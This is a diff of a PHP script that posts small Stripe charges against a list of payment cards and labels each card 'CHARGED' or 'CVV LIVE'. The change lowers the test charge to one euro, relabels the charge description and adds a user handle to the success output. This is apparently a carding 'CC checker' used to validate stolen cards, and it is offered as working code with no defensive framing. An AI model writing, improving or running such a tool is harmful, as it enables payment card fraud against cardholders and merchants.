@@ -82,7 +82,7 @@ if (strlen($ano) == 2) $ano = "20$ano";
         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);  
         curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);  
         curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  
-        curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=100&currency=eur&payment_method_types[]=card&description=Shahad Donation&payment_method='.$tok1.'&confirm=true&off_session=true');  
+        curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=1&currency=eur&payment_method_types[]=card&description=undefy&payment_method='.$tok1.'&confirm=true&off_session=true');  
         $result2 = curl_exec($ch);  
         $tok2 = Getstr($result2,'"id": "','"');  
         $receipturl = trim(strip_tags(getStr($result2,'"receipt_url": "','"')));  
@@ -100,7 +100,7 @@ if (strlen($ano) == 2) $ano = "20$ano";
 //=================== [ RESPONSES ] ===================//
 
 if(strpos($result2, '"seller_message": "Payment complete."' )) {
-    echo 'CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>➤ Response: €'.$amt.' Charged ✅ <br> ➤ Receipt : <a href='.$receipturl.'>Here</a><br>';
+    echo 'CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>➤ Response: €'.$amt.' Charged by @balenottere <br> ➤ Receipt : <a href='.$receipturl.'>Here</a><br>';
 }
 elseif(strpos($result2,'"cvc_check": "pass"')){
     echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV LIVE</span><br>';
